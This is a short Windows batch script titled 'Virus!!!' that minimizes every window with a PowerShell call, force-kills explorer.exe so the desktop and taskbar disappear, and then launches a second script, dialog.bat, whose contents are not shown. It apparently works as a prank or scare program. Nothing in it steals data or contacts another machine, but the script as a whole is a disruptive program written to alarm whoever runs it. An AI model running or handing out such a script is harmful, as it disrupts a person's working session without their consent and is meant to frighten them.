@echo off
chcp 65001 > nul
title Virus!!!


PowerShell -Command "(New-Object -ComObject Shell.Application).MinimizeAll()"
taskkill /f /im explorer.exe
start dialog.bat
exit /b 0